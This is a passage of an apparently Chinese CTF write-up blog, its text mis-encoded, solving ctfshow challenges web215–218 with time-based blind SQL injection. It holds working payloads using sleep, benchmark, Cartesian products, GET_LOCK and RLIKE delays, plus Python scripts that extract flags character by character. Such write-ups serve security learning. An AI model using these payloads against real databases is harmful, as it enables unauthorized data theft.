é”™äº†å¯æ²¡æœ‰å›æ˜¾</p><h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><p>æç¤ºç”¨äº†å•å¼•å·ï¼Œå¾—é—­åˆä¸€ä¸‹å°±è¡Œ<br>æµ‹è¯•payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">1</span><span class="string">&#x27; or sleep(3) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>&amp;debug=<span class="number">0</span></span><br><span class="line">æˆ–è€…</span><br><span class="line">ip=<span class="number">1</span><span class="string">&#x27; or sleep(3) #&amp;debug=0</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLæ—¶é—´ç›²æ³¨1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://8f775fc1-f6d1-431e-9ac4-93ab0f082a11.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxc&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;select group_concat(flagaa) from ctfshow_flagxc&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1&#x27; or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),sleep(1),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># çœ‹äº†Y4tackerä½¬çš„wpï¼Œçœ‹åˆ°è¿™ç§å†™æ³•ï¼Œè§‰å¾—å¤ªå¦™äº†ã€‚ç”¨tryæ¥å¾®è°ƒ</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ³¨æ„-1"><a href="#æ³¨æ„-1" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>æ“ä½œå¯ä»¥å¿«ä¸€ç‚¹ï¼Œç”¨ä¸€ç‚¹å¿«æ·é”®ã€‚<br>pycharmä¸­æœç´¢å¿«æ·é”®<code>ctrl + f</code>ï¼Œæ›¿æ¢å¿«æ·é”®<code>ctrl + r</code>ã€‚<br>æœç´¢ä¸­ä¿®æ”¹æ­£åˆ™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[a-zA-Z0-<span class="number">9</span>-./]+</span><br></pre></td></tr></table></figure><p>ç„¶åæ›¿æ¢å†™å…¥æ–°ç½‘å€ï¼Œè¿™æ ·å°±èƒ½å¿«ä¸€ç‚¹</p><h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><h3 id="from-base64-id"><a href="#from-base64-id" class="headerlink" title="from_base64($id)"></a>from_base64($id)</h3><p>åŠ äº†ä¸€ä¸ªæŸ¥è¯¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where <span class="built_in">id</span> = from_base64($<span class="built_in">id</span>);</span><br></pre></td></tr></table></figure><p>åªéœ€è¦æŠŠ1çš„base64 <code>MQ==</code>ï¼Œæ·»åŠ çš„åˆ°åŸpayloadä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="string">&#x27;MQ==&#x27;</span>) <span class="keyword">or</span> sleep(<span class="number">3</span>) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&amp;debug=0</span></span><br></pre></td></tr></table></figure><h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><h3 id="benchmarkå‡½æ•°çš„æ—¶é—´ç›²æ³¨"><a href="#benchmarkå‡½æ•°çš„æ—¶é—´ç›²æ³¨" class="headerlink" title="benchmarkå‡½æ•°çš„æ—¶é—´ç›²æ³¨"></a>benchmarkå‡½æ•°çš„æ—¶é—´ç›²æ³¨</h3><p>åŠ äº†ä¸ªè¿‡æ»¤ï¼ŒæŠŠsleepç»™banäº†ï¼Œå¯ä»¥ç”¨benchmarkä»£æ›¿ã€‚<br>BENCHMARKæ˜¯SQLä¸­çš„ä¸€ä¸ªå‡½æ•°,ä¸»è¦ç”¨äºæµ‹è¯•SQLè¯­å¥çš„æ‰§è¡Œæ•ˆç‡ã€‚å…¶è¯­æ³•å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count, expr)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­countè¡¨ç¤ºé‡å¤æ‰§è¡Œexprçš„æ¬¡æ•°ã€‚<br>è¿™é‡Œçš„æµ‹è¯•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=<span class="number">1</span>) <span class="keyword">and</span> benchmark(<span class="number">500000</span>,sha(<span class="number">1</span>))<span class="comment">#&amp;debug=0</span></span><br></pre></td></tr></table></figure><p>ç”±äºç½‘ç»œç¯å¢ƒä¸åŒï¼Œéœ€è¦æ ¹æ®æƒ…å†µä¸‹å¾®è°ƒtimeoutçš„å€¼ï¼š<br>è¿™é‡Œæˆ‘æœ‰ç‚¹æ²¡å¤ªæ˜ç™½çš„ç‚¹åœ¨äºï¼Œä¸ºä»€ä¹ˆè°ƒç”¨databaseå‡½æ•°æ—¶å’ŒæŸ¥è¯¢æ—¶ç›¸åŒbenchmarkçš„å»¶è¿Ÿå·®å¾ˆå¤š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ¯”å¦‚</span><br><span class="line">ip=<span class="number">1</span>) <span class="keyword">or</span> <span class="keyword">if</span>(substr((database()),<span class="number">1</span>,<span class="number">1</span>)=(<span class="string">&#x27;c&#x27;</span>),benchmark(<span class="number">500000</span>,sha(<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">&amp;debug=<span class="number">0</span></span><br><span class="line">æœ‰<span class="number">1.45</span>s</span><br><span class="line">è€Œ</span><br><span class="line">ip=<span class="number">1</span>) <span class="keyword">or</span> <span class="keyword">if</span>(substr((select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()),<span class="number">1</span>,<span class="number">1</span>)=(<span class="string">&#x27;c&#x27;</span>),benchmark(<span class="number">3500000</span>,sha(<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">&amp;debug=<span class="number">0</span></span><br><span class="line">æ˜¯<span class="number">1.72</span>s</span><br></pre></td></tr></table></figure><p>å› æ­¤æ¬¡æ•°åœ¨è„šæœ¬ä¸­éœ€è¦å¤šæ¬¡è°ƒè¯•ã€‚<br>è€Œä¸”ç”±äºè¿™ä¸ªæ—¶é—´æ˜¯éšç€è¿è¡Œæ—¶é—´å¢é•¿è€Œä¼šå¯¼è‡´è¶Šåˆ°åé¢è¶Šä¸å‡†ç¡®ã€‚<br>å› æ­¤å¯ä»¥ç”¨limitå…³é”®å­—å¯¹flagè¿›è¡Œåˆ†å‰²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLæ—¶é—´ç›²æ³¨1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://b78d98e8-2199-4723-bf89-18fed148eb42.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxccb&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaabc) from ctfshow_flagxccb),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),benchmark(2500000,sha(1)),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># çœ‹äº†Y4tackerä½¬çš„wpï¼Œçœ‹åˆ°è¿™ç§å†™æ³•ï¼Œè§‰å¾—å¤ªå¦™äº†ã€‚ç”¨tryæ¥å¾®è°ƒ</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿä¹‹å‰çš„flag<br><code>ctfshow&#123;c059a105-e0f9-41b5-a49e-002ac179386a&#125;</code><br>ä»ç¬¬ä¹ä½å¼€å§‹ä¸ƒä½ï¼Œä»17å¼€å§‹10ä½ ä»28å¼€å§‹12ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">44n3955e</span><br><span class="line">-cec3-</span><br><span class="line">4c84-</span><br><span class="line">bb3f-</span><br><span class="line">91f5caab1040&#125;</span><br><span class="line">ctfshow&#123;44n3955e-cec3-4c84-bb3f-91f5caab1040&#125;</span><br><span class="line">44239p5d-cec3-4c84-bb3f-91f5caab1040fb</span><br><span class="line">4443955d</span><br></pre></td></tr></table></figure><p>è¿™é“å¤ªæŠ˜ç£¨äººäº†åšçš„è¦æ­»äº†ã€‚ æˆ‘æ“äº† æ³¨ä¸‰éä¸‰ä¸ªç»“æœï¼Œç ´bè„šæœ¬è·‘äº†3ä¸ªå°æ—¶ï¼Œè¿˜æ˜¯ç”¨å¤§ä½¬ä»¬çš„äºŒåˆ†æ³•è·‘å§ï¼Œè¿™ä¸ªä¹Ÿå¤ªæ…¢äº†ã€‚</p><h2 id="å…¶ä»–çš„æ—¶é—´ç›²æ³¨éªšå§¿åŠ¿"><a href="#å…¶ä»–çš„æ—¶é—´ç›²æ³¨éªšå§¿åŠ¿" class="headerlink" title="å…¶ä»–çš„æ—¶é—´ç›²æ³¨éªšå§¿åŠ¿"></a>å…¶ä»–çš„æ—¶é—´ç›²æ³¨éªšå§¿åŠ¿</h2><blockquote><p><a href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p></blockquote><h3 id="ç¬›å¡å°”ç§¯ç›²æ³¨"><a href="#ç¬›å¡å°”ç§¯ç›²æ³¨" class="headerlink" title="ç¬›å¡å°”ç§¯ç›²æ³¨"></a>ç¬›å¡å°”ç§¯ç›²æ³¨</h3><p>æ³¨å…¥å§¿åŠ¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| <span class="number">113101560</span> |</span><br><span class="line">+-----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">2.07</span> sec)</span><br><span class="line"> </span><br><span class="line"> mysql&gt; select  <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| <span class="number">1</span>    | <span class="number">0</span>   |</span><br><span class="line">+------+-----+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">2.08</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select  <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span> <span class="keyword">and</span> (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨andçŸ­è·¯è¿ç®—è§„åˆ™è¿›è¡Œæ—¶é—´ç›²æ³¨ã€‚</p><h3 id="GET-LOCKç›²æ³¨"><a href="#GET-LOCKç›²æ³¨" class="headerlink" title="GET_LOCKç›²æ³¨"></a>GET_LOCKç›²æ³¨</h3><p>get_lockå‡½æ•°å®˜æ–¹æ–‡æ¡£ä¸­çš„ä»‹ç»<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689289973207-90f19c56-353b-4128-8a5c-9b65198645bf.png" alt="ZZAQbT.md.png"><br>å¯ä»¥çœ‹å‡ºæ–‡æ¡£ä¸­å†™çš„æ˜¯æˆ‘ä»¬å¦‚æœå·²ç»å¼€äº†ä¸€ä¸ªsessionï¼Œå¯¹å…³é”®å­—è¿›è¡Œäº†get_lock,é‚£ä¹ˆå†å¼€å¦ä¸€ä¸ªsessionå†æ¬¡å¯¹å…³é”®è¿›è¡Œget_lockï¼Œå°±ä¼šå»¶æ—¶æˆ‘ä»¬æŒ‡å®šçš„æ—¶é—´ã€‚<br>æ­¤ç›²æ³¨æ‰‹æ³•æœ‰ä¸€äº›é™åˆ¶ï¼Œå°±æ˜¯å¿…é¡»è¦åŒæ—¶å¼€ä¸¤ä¸ªSESSIONè¿›è¡Œæ³¨å…¥<br>SESSION A</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">1</span>) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       <span class="number">1</span> |</span><br><span class="line">+-------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>SESSION B</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       <span class="number">0</span> |</span><br><span class="line">+-------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">5.00</span> sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt; select * <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span>  get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">2.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span> <span class="keyword">and</span>  get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ç›²æ³¨åˆ©ç”¨æ‰‹æ³•ã€‚</p><h3 id="æ­£åˆ™DOS-RLIKEæ³¨å…¥"><a href="#æ­£åˆ™DOS-RLIKEæ³¨å…¥" class="headerlink" title="æ­£åˆ™DOS RLIKEæ³¨å…¥"></a>æ­£åˆ™DOS RLIKEæ³¨å…¥</h3><p>å»¶æ—¶åŸç†ï¼Œåˆ©ç”¨SQLå¤šæ¬¡è®¡ç®—æ­£åˆ™æ¶ˆè€—è®¡ç®—èµ„æºäº§ç”Ÿå»¶æ—¶æ•ˆæœï¼Œå…¶å®åŸç†æ˜¯å’Œæˆ‘ä»¬çš„benchmarkæ³¨å…¥å·®ä¸å¤šçš„ã€‚<br>åˆ©ç”¨æ‰‹æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  <span class="keyword">from</span> flag where flag=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(mid(user(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>,concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+b&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| <span class="number">1</span>    |</span><br><span class="line">+------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select  <span class="keyword">from</span> flag where flag=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(mid(user(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;r&#x27;</span>,concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+cd&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">3.83</span> sec)</span><br></pre></td></tr></table></figure><h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><h3 id="ç¬›å¡å°”ä¹˜ç§¯"><a href="#ç¬›å¡å°”ä¹˜ç§¯" class="headerlink" title="ç¬›å¡å°”ä¹˜ç§¯"></a>ç¬›å¡å°”ä¹˜ç§¯</h3><p>benchmarkä¹Ÿè¢«ç¦ç”¨äº†ï¼Œç”¨ç¬›å¡å°”ç§¯è¿ç®—æ¥è¾¾åˆ°å»¶è¿Ÿçš„ç›®çš„<br>ä¸»è¦çš„è¯­å¥æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥åˆ°payloadé‡Œé¢æµ‹è¯•ä¸€ä¸‹ï¼š<br>ä¸å¤Ÿå°±ä¸€ç›´åŠ ï¼ŒåŠ åˆ°æœ‰å»¶è¿Ÿä¸ºæ­¢ã€‚<br>å°±ä¸ä¸€ç‚¹ç‚¹çˆ†äº†ï¼Œç›´æ¥æ¢­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 